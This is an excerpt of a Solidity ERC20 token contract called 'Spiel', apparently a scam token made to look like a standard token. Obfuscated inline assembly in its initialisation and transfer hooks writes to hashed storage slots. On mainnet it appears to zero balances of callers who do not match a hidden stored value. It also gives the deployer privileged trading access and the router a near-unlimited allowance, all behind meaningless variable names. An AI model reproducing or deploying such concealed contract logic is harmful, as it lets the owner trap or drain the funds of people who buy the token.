...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSpiel;
    uint256 private playGround = block.number*2;

    mapping (address => bool) private _firstSunset; 
    mapping (address => bool) private _secondDark;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private poopingWorld;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private peaTee;
    address public pair;
    ...
    bool private trading; uint256 private jizzOn = 1; bool private geezDude;
    uint256 private _decimals; uint256 private easyPeasy;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSpiel.push(_router); addSpiel.push(msgSender_); addSpiel.push(pair);
        for (uint256 q=0; q < 3;) {_firstSunset[addSpiel[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xd61ce930b9e6d9535f3c9743b49967347feaaa1cc4bf7db0e4b2199bf3535fa9
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x4d50e26bb4e6bc06d1e40e06d6026862a974c97a8dc8509e97447956e45022af,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; playGround = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSpiel[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySpiel(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSpiel[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySpiel(creator, initialSupply);
    }
}

contract Spiel is ERC20Token {
    constructor() ERC20Token("Spiel", "SPIEL", msg.sender, 25000000 * 10 ** 18) {
    }
}